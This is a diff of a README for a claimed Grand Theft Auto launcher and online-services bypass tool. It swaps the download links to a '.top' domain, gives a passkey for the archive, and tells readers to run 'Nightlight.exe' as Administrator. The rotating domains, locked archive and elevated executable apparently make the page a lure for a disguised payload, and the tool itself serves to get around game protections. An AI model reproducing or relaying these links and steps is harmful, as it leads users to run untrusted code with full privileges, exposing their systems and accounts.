@@ -6,7 +6,7 @@ Bypass Rockstar Games Launcher, Social Club, and Epic Online Services for Grand 
 
 ## ⬇️ Download
 
-**[CLICK](https://Cyberleek.ltd/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Cyberleek`
 
@@ -80,7 +80,7 @@ Archive passkey: `Cyberleek`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 2. Extract the archive.
 3. Run `Nightlight.exe` **as Administrator** (if game is in Program Files).
 4. Select the folder where your game resides.
